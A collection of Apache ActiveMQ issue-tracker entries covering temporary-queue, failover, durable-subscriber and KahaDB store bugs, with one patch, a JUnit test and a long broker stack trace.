Create a necessary resources for easy use of ActiveMQ in Apache Karaf, such as features for up to date ActiveMQ version for broker and web console and up-to-date commands.
issueID:AMQ-2571
type:Bug
changed files:AMQ2571.java
texts:Sender sometimes, involuntary, autocreates new, consumerless, TempQueue when trying to send to removed TempQueue.
Please see this post for discussion:http://old.nabble.com/Problems-with-prefetch-and-TemporaryQueues-td27130529.htmlI"ve tested this on 4.1.1, and briefly on 5.3.0 with the same result.Scenario:We have a server and a client. The client posts a message on the servers queue in order to subscribe to updates.The server takes the reply address from the client and starts sending messages to a TempQueue created by the client.When the client disconnects without notifying the server the following might happen:1. The temporary queue is removed correctly when the client exits and closes its connection.From here we have three scenarios:2.a The server gets an exception the next time it tries to send a message to the TempQueue. This is wanted behaviour. It can then simply drop the "subscription".2.b The server isn"t notified in time and sends some messages before it gets the exception. Due to AutoCreateDestination being enabled one of these messages creates a new TempQueue with the same name as the one removed. It is of course missing a consumer.But since the server gets the exception it will stop posting to the TempQueue. However, when the server closes its connection the TempQueue is not removed and is left lying around with no consumer.2.c The server recreates the TempQueue in the same way as in 2.b, but here it never gets the exception for some reason. The server then has no idea that the client left and keeps pilling up messages on the TempQueue until the broker object hits its memory limit and everything connected to the broker halts.I think there are three problems here:1. The exception is not thrown every time.2. When the TempQueue is recreated it is not removed when the server closes its connection. Also, the server gets an InvalidDestinationException if I, at server side, try to connect a consumer to the TempQueue. I guess this means that although the server is the initiator for the auto(re)creation it does not become the owner of the TempQueue. But who is then the owner? The broker itself?3. Due to AutoCreateDestination being enabled by default for TempQueues, every post to a TempQueue could result in unknowingly creating a new TempQueue.SuggestionsSetting AutoCreateDestination to false for TempQueues solves all three problems.So exposing that option in an easily accessible way is important.But even then, 1 and 2 should perhaps be examined separately.I"ll attach a JUnit test case for this. Unfortunately it is not 100% reliable in detecting the problem. One has to run it multiple times.On my test setup it failed correctly 8 times out of 10 runs. You might be able to improve it.Best RegardsNimos
issueID:AMQ-2572
type:Bug
changed files:
texts:Timing issue on consumer close can lead to unconsumed messages being inadvertently marked as duplicates and not getting delivered
Intermittent failure of activemq-core/src/test/java/org/apache/activemq/bugs/AMQ2102Test.java on Linux. Tracking this failure down, the problem of the hung test was missing messages, part of the prefetch that were delivered while the consumer was closing. A timing issue between the audit rollback of  unconsumed messages and the delivery of messages meant that some messages were not rolledback on close.The use case has consumers that connect, consume a batch of 10 messages in individual transactions and close. These operations complete before the prefetch(1000) messages haven been delivered so there was concurrent delivery and closure happing which sometimes resulted in the problem.The fix is to ensure the consumer is removed from the session and closed prior to doing the audit rollback on unconsumed messages.
issueID:AMQ-2573
type:Bug
changed files:
texts:Failover with async rollback of message audit can lead to over eager duplicate suppression (auto acking) and apparent missing messages
with multiple unordered message consumers on a connection and failover with default prefetch recovery processing can lead to incorrect duplicate detection.Duplicates are expected as all unacked messages will be redelivered on recovery. An active consumer may have unconsumed messages which need to be rolled back in the message audit. currently this rollback is occurring at an indeterminate time w.r.t to future dispatch.given consumer 1 has unconsumed messages 0-10, consumer 2 11-20 etc.. all need to be rolled back prior to recovery of consumer 3 which may get any message in the range 0 - 20 delivered to it. Currently, rollbacks are done on the next delivery. All audit rollbacks need to be complete before any new delivery occurs on a recovered connection.The result of over eager duplicate suppression is missing messages as the duplicates are auto acked.Symptom: missing messages from a consumer perspective. With debug logging on log4j.logger.org.apache.activemq.ActiveMQMessageConsumer=DEBUG it is possible to catch the duplicate suppression. If your missing messages are in this set, you may have this problem.workaround is to reduce the prefetch or even use a pull consumer, prefetch=0 such that unconsumed messages do not back up in the consumers dispatch queue pending receive() calls. With async listeners where the consumers can keep up with dispatch, this will not be a problem,
issueID:AMQ-2574
type:Improvement
changed files:
texts:Try to stop OSGi bundle when closing application context
When using destroyApplicationContextOnShutdown="true", ActiveMQ will try to close application context when error such as database down is encountered. This will allow it to be cleanly stopped in an environment such as ServiceMix. However, when the broker is started as an OSGi bundle, the bundle will be left in status "started" event when the context is destroyed. We should try to stop the appropriate bundle in this case.
issueID:AMQ-2575
type:Improvement
changed files:
texts:don&#39;t use Kaha for creation of temporary files
The FilePendingMessageCursor uses Kaha as the persistent engine for non-persistent messages flushed to disk when memory limits run low. To reduce the use of file descriptors - use KahaDB instead
issueID:AMQ-2579
type:Improvement
changed files:
texts:Failover connection recovery needs a new command to indicate recovery completion that can gate dispatch on a recovered consumer
Unconsumed messages at a consumer need to be rolledback on recovery as they can get redispatched in arbitrary order. see  - https://issues.apache.org/activemq/browse/AMQ-2573As operations are in progress, like a send transaction, the rollback cannot happen till the send transaction commit completes so it must be async with the failover interruption. Dispatch needs to be gated on completion of the outstanding operations as it currently is with the resolution to AMQ-2573However there is the possibility that the broker starts to dispatch to that consumer/connection before recovery is complete and can block the receipt of messages, the response to the send commit for example as the dispatch is waiting for the send to complete so that any unconsumed messages are rolledback in advance of dispatch. With asyncDispatch=false and optimizedDispatch it is possible to simulate this. The solution requires two wireformat changes, An indication on a connection that it is recovering (this can be propagated to a consumer)  and an indication that recovery is complete such that dispatch on a recovered consumer can complete. An additional AckMode AckRecoveryComplete could do it.Thus dispatch would be gated such that it cannot interfere with outstanding work that needs to be restored and completed inorder to correctly clear unconsumed and delivered messages.
issueID:AMQ-2580
type:Bug
changed files:
texts:Durable subscribers receives nothing when reconnecting with a prefetch size less than the number of messages that don&#39;t match a message selector
1. Create a connection factory with a message prefetch size of PREFETCH_SIZE.2. Create a durable subscriber to a Topic with a message selector of "a=X". 3. Disconnect.4. More than PREFETCH_SIZE messages are then put onto the Topic with a string property "a=Y".5. Just one message is put onto the Topic with string property "a=X".6. The durable subscriber connects again but it does not get the message with string property "a=X". In fact, it gets nothing.It appears that upon reconnecting, the message selector is not respected when retrieving the message from storage.I"ve got a unit test to demonstrate this plus a proposed fix.### Eclipse Workspace Patch 1.0#P activemqIndex: activemq-core/src/main/java/org/apache/activemq/store/kahadaptor/KahaTopicReferenceStore.java===================================================================--- activemq-core/src/main/java/org/apache/activemq/store/kahadaptor/KahaTopicReferenceStore.java       (revision 900353)+++ activemq-core/src/main/java/org/apache/activemq/store/kahadaptor/KahaTopicReferenceStore.java       (working copy)@@ -306,7 +306,7 @@                                 count++;                                 container.setBatchEntry(msg.getMessageId(), entry);                             } else {-                                break;+                                //break;                             }                         } else {                             container.reset();Index: activemq-core/src/main/java/org/apache/activemq/store/amq/RecoveryListenerAdapter.java===================================================================--- activemq-core/src/main/java/org/apache/activemq/store/amq/RecoveryListenerAdapter.java      (revision 900353)+++ activemq-core/src/main/java/org/apache/activemq/store/amq/RecoveryListenerAdapter.java      (working copy)@@ -46,10 +46,11 @@          public boolean recoverMessage(Message message) throws Exception {         if (listener.hasSpace()) {-            listener.recoverMessage(message);-            lastRecovered = message.getMessageId();-            count++;-            return true;+            if (listener.recoverMessage(message)) {+                lastRecovered = message.getMessageId();+                count++;+                return true;+            }         }         return false;     }Index: activemq-pool/src/test/java/org/apache/activemq/pool/PrefetchTest.java===================================================================--- activemq-pool/src/test/java/org/apache/activemq/pool/PrefetchTest.java      (revision 0)+++ activemq-pool/src/test/java/org/apache/activemq/pool/PrefetchTest.java      (revision 0)@@ -0,0 +1,174 @@+package org.apache.activemq.pool;++import java.io.File;++import javax.jms.JMSException;+import javax.jms.MessageConsumer;+import javax.jms.MessageProducer;+import javax.jms.Session;+import javax.jms.TextMessage;+import javax.jms.Topic;+import javax.jms.TopicConnection;+import javax.jms.TopicSession;++import junit.framework.TestCase;++import org.apache.activemq.ActiveMQConnectionFactory;+import org.apache.activemq.ActiveMQPrefetchPolicy;+import org.apache.activemq.broker.BrokerService;+import org.apache.activemq.store.PersistenceAdapter;++public class PrefetchTest extends TestCase {++       private static final String TOPIC_NAME = "topicName";+       private static final String CLIENT_ID = "client_id";+       private static final String textOfSelectedMsg = "good_message";++       protected TopicConnection connection;++       private Topic topic;+       private Session session;+       private MessageProducer producer;+       private PooledConnectionFactory connectionFactory;+       private TopicConnection topicConnection;+       private String bindAddress;+       private BrokerService service;++       protected void setUp() throws Exception {+               bindAddress = "tcp://localhost:61616";+               super.setUp();+               initDurableBroker();+               initConnectionFactory();+               initTopic();++       }++       protected void tearDown() throws Exception {+           shutdownClient();+               connectionFactory.stop();+               service.stop();+               super.tearDown();+       }++       private void initConnection() throws JMSException {+           System.out.println("Initializing connection");+               connection = (TopicConnection) connectionFactory.createConnection(); +               connection.start();+       }++    public void testTopicIsDurableSmokeTest() throws Exception {+        +       initClient();+       MessageConsumer consumer = createMessageConsumer();+       System.out.println("Consuming message");+       assertNull(consumer.receive(1));+       shutdownClient();+       consumer.close();+    +       sendMessages();+       shutdownClient();+    +       initClient();+       consumer = createMessageConsumer();+    +       System.out.println("Consuming message");+       TextMessage answer1 = (TextMessage)consumer.receive(1000);+       assertNotNull(answer1);+    +       consumer.close();+    }+    +    private MessageConsumer createMessageConsumer() throws JMSException {+        System.out.println("creating durable subscriber");+       return session.createDurableSubscriber(topic, +               TOPIC_NAME, +               "name="value"", +               false);+    }++       private void initClient() throws JMSException {+           System.out.println("Initializing client");+           +               initConnection();+       initSession();+       }++       private void shutdownClient()+                       throws JMSException {+           System.out.println("Closing session and connection");+        session.close();+        connection.close();+        session = null;+        connection = null;+       }++       private void sendMessages()+                       throws JMSException {+           initConnection();++               initSession();++               System.out.println("Creating producer");+               producer = session.createProducer(topic);++               sendMessageThatFailsSelection();+        +               sendMessage(textOfSelectedMsg, "value");+       }++       private void initSession() throws JMSException {+           System.out.println("Initializing session");+               session = connection.createTopicSession(false, Session.AUTO_ACKNOWLEDGE);+       }++       private void sendMessageThatFailsSelection() throws JMSException {+               for (int i = 0 ; i < 5 ; i++) {+                       String textOfNotSelectedMsg = "Msg_" + i;+                       sendMessage(textOfNotSelectedMsg, "not_value");+                       System.out.println("#");+               }+       }++       private void sendMessage(+                       String msgText,+                       String propertyValue) throws JMSException {+           System.out.println("Creating message: " + msgText);+               TextMessage messageToSelect = session.createTextMessage(msgText);+        messageToSelect.setStringProperty("name", propertyValue);+        System.out.println("Sending message");+               producer.send(messageToSelect);+       }++       protected void initConnectionFactory() {+               ActiveMQConnectionFactory activeMqConnectionFactory = createActiveMqConnectionFactory();+               connectionFactory = new PooledConnectionFactory(activeMqConnectionFactory);+       }+++       private ActiveMQConnectionFactory createActiveMqConnectionFactory() {+               ActiveMQConnectionFactory activeMqConnectionFactory = new ActiveMQConnectionFactory();+        ActiveMQPrefetchPolicy prefetchPolicy = new ActiveMQPrefetchPolicy();+        prefetchPolicy.setDurableTopicPrefetch(2);+               activeMqConnectionFactory.setPrefetchPolicy(prefetchPolicy );+        activeMqConnectionFactory.setClientID(CLIENT_ID);+               return activeMqConnectionFactory;+       }++       private void initDurableBroker() throws Exception {+               service = new BrokerService();+               PersistenceAdapter persistenceAdaptor = service.getPersistenceAdapter();+               File file = new File("phills_durable_dir");+               persistenceAdaptor.setDirectory(file);+               service.setTransportConnectorURIs(new String[] { bindAddress } );+               service.setPersistent(true);+               service.setUseJmx(true);+               service.start();++       }++       private void initTopic() throws JMSException {+               topicConnection = (TopicConnection) connectionFactory.createConnection();+               TopicSession topicSession = topicConnection.createTopicSession(false, Session.AUTO_ACKNOWLEDGE);+               topic = topicSession.createTopic(TOPIC_NAME);+       }+}
issueID:AMQ-2583
type:New Feature
changed files:
texts:Implement stomp+nio+ssl transport
None
issueID:AMQ-2584
type:Bug
changed files:
texts:Massege store is not cleaned when durable topic subscribers are refusing messages
Hi,i am using activemq 5.3 (resp. 5.4 snapshot , 5.3.1 snapshot) with kahadb in following use-case: 3 durable topic subscriber, each refuses message using session.recover(), 1 delivery attempts ActiveMQ.DLQ consumer persistent message topic producerIn such case deadletter consumer should consume every message sent, as soon as number of delivery attempts is reached and mmessage is sent to ActiveMQ.DLQ. Result is ok but kahadb data directory at the end contains all log files with names db-<number>.log ever created. They aren"t deleted even after some time.I can also see following massege in console:WARN | Duplicate message add attempt rejected. Message id: ID:sk1d069c-3826-1264006781626-0:0:1:1:13425If use-case is altered to use queue instead of topic log files are periodically deleted without WARN messages in console.Same behaviour (data files not cleaned) if amqPersistenceAdapter is used except of WARN messages.
issueID:AMQ-2585
type:Bug
changed files:
texts:ActiveMQTextMessage.getSize() does not consider size of properties
Checking the size of a text message only considers the body of a message, not the properties. I think this relates to a typo in the method:    public int getSize() {        if (size == 0 && content == null && text != null) {            size = getMinimumMessageSize();            if (marshalledProperties != null) {                size += marshalledProperties.getLength();            }            size = text.length() * 2;        }        return super.getSize();    }This should perhaps be size += text.length() * 2?
issueID:AMQ-2586
type:Bug
changed files:Topic.java
texts:"queue size " metrics for topics not accurate
The queue size metric for topics is currently not accurate.  It is also throwing off the broker total message count metric.  In the queue case this metric is always going up but never comes down.  Since there is no "queue" for topics it would be better if this metrics just reported 0.An alternative solution would be to sum the number of messages in all the subscriptions attached to the topic.
issueID:AMQ-2588
type:Bug
changed files:
texts:Broker async disconnect of connections while waiting for slave to connect can lead to hung failover transport
failover transport can miss an async exception or inactivity timeout exception while in the process of doing a reconnect and can signal reconnection complete in error, leading to a hang.Some slight changes to AMQ2183Test which demonstrated intermittent hangs made it reliably reproducible and lead to the diagnosis. Test scenario is trying to connect to a broker that is waiting for a slave to connect to it. so a pure master slave setup. The failover will eventually hang thinking it has successfully reconnected but has missed an exception.
issueID:AMQ-2589
type:Bug
changed files:MessageDatabase.java
texts:NullPointer in MessageDatabase.java on restarting after ungraceful exit
If I kill -9 the broker when the broker is heavily loaded with transactional consumers I see the following error when I try and restart the broker.INFO  ManagementContext              - JMX consoles can connect to service:jmx:rmi:///jndi/rmi://localhost:2010/jmxrmiINFO  BrokerService                  - Using Persistence Adapter: org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter@4f3ba2ERROR BrokerService                  - Failed to start ActiveMQ JMS Message Broker. Reason: java.lang.NullPointerExceptionjava.lang.NullPointerException        at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:876)        at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82)        at org.apache.activemq.store.kahadb.MessageDatabase$RemoveOpperation.execute(MessageDatabase.java:1395)        at org.apache.activemq.store.kahadb.MessageDatabase$16.execute(MessageDatabase.java:800)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:797)        at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:710)        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692)        at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:393)        at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280)        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321)        at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182)        at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:456)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:61)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1369)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)        at java.security.AccessController.doPrivileged(Native Method)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)        at org.apache.activemq.console.Main.main(Main.java:107)INFO  BrokerService                  - ActiveMQ Message Broker (adcmq-INT, null) is shutting downINFO  TransportConnector             - Connector openwire StoppedINFO  TransportConnector             - Connector ssl StoppedINFO  BrokerService                  - ActiveMQ JMS Message Broker (adcmq-INT, null) stoppedERROR: java.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.NullPointerExceptionjava.lang.RuntimeException: Failed to execute start task. Reason: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.NullPointerException        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:98)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)        at org.apache.activemq.console.Main.main(Main.java:107)Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.NullPointerException        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)        at java.security.AccessController.doPrivileged(Native Method)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)        ... 10 moreCaused by: java.lang.NullPointerException        at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:876)        at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82)        at org.apache.activemq.store.kahadb.MessageDatabase$RemoveOpperation.execute(MessageDatabase.java:1395)        at org.apache.activemq.store.kahadb.MessageDatabase$16.execute(MessageDatabase.java:800)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:797)        at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:710)        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692)        at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:393)        at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280)        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321)        at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182)        at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:456)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:61)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1369)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)        ... 30 moreERROR: java.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.NullPointerExceptionjava.lang.Exception: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.NullPointerException        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:99)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.runTask(ShellCommand.java:136)        at org.apache.activemq.console.command.AbstractCommand.execute(AbstractCommand.java:57)        at org.apache.activemq.console.command.ShellCommand.main(ShellCommand.java:82)        at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)        at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:39)        at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:25)        at java.lang.reflect.Method.invoke(Method.java:597)        at org.apache.activemq.console.Main.runTaskClass(Main.java:251)        at org.apache.activemq.console.Main.main(Main.java:107)Caused by: org.springframework.beans.factory.BeanCreationException: Error creating bean with name "org.apache.activemq.xbean.XBeanBrokerService#0" defined in class path resource &#91;activemq.xml&#93;: Invocation of init method failed; nested exception is java.lang.NullPointerException        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1338)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.doCreateBean(AbstractAutowireCapableBeanFactory.java:473)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory$1.run(AbstractAutowireCapableBeanFactory.java:409)        at java.security.AccessController.doPrivileged(Native Method)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.createBean(AbstractAutowireCapableBeanFactory.java:380)        at org.springframework.beans.factory.support.AbstractBeanFactory$1.getObject(AbstractBeanFactory.java:264)        at org.springframework.beans.factory.support.DefaultSingletonBeanRegistry.getSingleton(DefaultSingletonBeanRegistry.java:222)        at org.springframework.beans.factory.support.AbstractBeanFactory.doGetBean(AbstractBeanFactory.java:261)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:185)        at org.springframework.beans.factory.support.AbstractBeanFactory.getBean(AbstractBeanFactory.java:164)        at org.springframework.beans.factory.support.DefaultListableBeanFactory.preInstantiateSingletons(DefaultListableBeanFactory.java:429)        at org.springframework.context.support.AbstractApplicationContext.finishBeanFactoryInitialization(AbstractApplicationContext.java:728)        at org.springframework.context.support.AbstractApplicationContext.refresh(AbstractApplicationContext.java:380)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:64)        at org.apache.xbean.spring.context.ResourceXmlApplicationContext.<init>(ResourceXmlApplicationContext.java:52)        at org.apache.activemq.xbean.XBeanBrokerFactory.createApplicationContext(XBeanBrokerFactory.java:96)        at org.apache.activemq.xbean.XBeanBrokerFactory.createBroker(XBeanBrokerFactory.java:52)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:71)        at org.apache.activemq.broker.BrokerFactory.createBroker(BrokerFactory.java:54)        at org.apache.activemq.console.command.StartCommand.startBroker(StartCommand.java:115)        at org.apache.activemq.console.command.StartCommand.runTask(StartCommand.java:74)        ... 10 moreCaused by: java.lang.NullPointerException        at org.apache.activemq.store.kahadb.MessageDatabase.updateIndex(MessageDatabase.java:876)        at org.apache.activemq.store.kahadb.MessageDatabase.access$700(MessageDatabase.java:82)        at org.apache.activemq.store.kahadb.MessageDatabase$RemoveOpperation.execute(MessageDatabase.java:1395)        at org.apache.activemq.store.kahadb.MessageDatabase$16.execute(MessageDatabase.java:800)        at org.apache.kahadb.page.Transaction.execute(Transaction.java:728)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:797)        at org.apache.activemq.store.kahadb.MessageDatabase$11.visit(MessageDatabase.java:710)        at org.apache.activemq.store.kahadb.data.KahaCommitCommand.visit(KahaCommitCommand.java:130)        at org.apache.activemq.store.kahadb.MessageDatabase.process(MessageDatabase.java:692)        at org.apache.activemq.store.kahadb.MessageDatabase.recover(MessageDatabase.java:393)        at org.apache.activemq.store.kahadb.MessageDatabase.open(MessageDatabase.java:280)        at org.apache.activemq.store.kahadb.MessageDatabase.load(MessageDatabase.java:321)        at org.apache.activemq.store.kahadb.MessageDatabase.start(MessageDatabase.java:182)        at org.apache.activemq.store.kahadb.KahaDBPersistenceAdapter.start(KahaDBPersistenceAdapter.java:183)        at org.apache.activemq.broker.BrokerService.start(BrokerService.java:456)        at org.apache.activemq.xbean.XBeanBrokerService.afterPropertiesSet(XBeanBrokerService.java:61)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.invokeInitMethods(AbstractAutowireCapableBeanFactory.java:1369)        at org.springframework.beans.factory.support.AbstractAutowireCapableBeanFactory.initializeBean(AbstractAutowireCapableBeanFactory.java:1335)        ... 30 more
issueID:AMQ-2590
type:Bug
changed files:
texts:Transaction commit/rollback through failover should throw TransactionRolledBackException if recovery redelivery dispatches to another consumer
Given an outstanding consumer transaction and failover transport recovery. On recovery, messages are redispatched by the broker once the connection, sessions and producers/consumers and transactions are replayed. Redispatch may not dispatch the same messages to the same consumers atm. In the case that a client transaction cannot be recreated it should fail with a TransactionRolledBackException. The failure indicates that the messages the session wants to ack have not again been redispatched so their receipt cannot be committed. The messages in question will have been redelivered to another consumer. Likewise in a rollback, in this case there is a warn message to the effect that the rolled back messages may not all be included in the rollback. It that they may not have been redispatched. The unordered redelivery semantics after a session rollback ensure that this error does not need to propagate up to the client.
issueID:AMQ-2594
type:Improvement
changed files:
texts:Make JDBC store resilient on broker sequence id order
Currently if the message is sent in a transaction, there"s a chance that messages are added to the cursor out of order (regarding broker seq id). The problem with JDBC store is that it does message recovery based on this seq id, which can lead to all kind of problems (such as orphaned messages in the database).The solution is to refactor JDBC store to use its own seq generator for recovering purposes and replace broker seq id, with message id for all other operations
issueID:AMQ-2598
type:Bug
changed files:
